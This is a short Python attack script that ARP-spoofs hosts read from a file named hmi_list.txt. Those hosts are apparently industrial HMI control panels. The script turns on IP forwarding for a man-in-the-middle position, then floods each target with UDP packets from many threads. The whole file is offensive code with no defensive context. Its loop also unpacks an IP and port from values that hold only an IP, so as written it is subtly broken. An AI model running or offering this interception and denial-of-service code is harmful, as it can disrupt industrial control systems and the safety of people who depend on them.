import os
import random
import socket
import subprocess
import threading
import time

ip_list = []
hmi = {}
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)
sent = 0

#need to install "sudo apt install dsniff"

def clear_file():
    with open("./hmi_list.txt", "w") as f:
        f.write("")

def read_from_file():
    l = []
    with open("hmi_list.txt", "r") as f:
        for line in f:
            ip = line.split("/")[0]
            l.append(ip)
    return l

def mitm(victim_ip, gateway_ip):
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    proc = subprocess.Popen(args=["arpspoof", "-i", "eth0", "-t", victim_ip, "-r", gateway_ip], stdout=subprocess.PIPE)
    time.sleep(30)
    proc.kill()
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")


def dos_attack(ip, port):
    global sent, bytes
    while True:
        sock.sendto(bytes, (ip, port))


def attack(victim_ip, port, gateway_ip):
    mitm(victim_ip, gateway_ip)
    time.sleep(30)

    # Until the mitm Done
    for i in range(20):
        threading.Thread(target=dos_attack, args=[victim_ip, port]).start()

def attack_network():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))

    local_ip = s.getsockname()[0]
    build_ip = local_ip.split(".")
    gatway = f"{build_ip[0]}.{build_ip[1]}.{build_ip[2]}.1"

    print("[+] Start attacking HMI...")
    for (ip, port) in read_from_file():
        while threading.active_count() > 400:
            pass
        print(f"Start attack --> {ip}:{port}")
        threading.Thread(target=attack, args=[ip, port, gatway]).start()
    clear_file()
    print("[+] attacking done")

attack_network()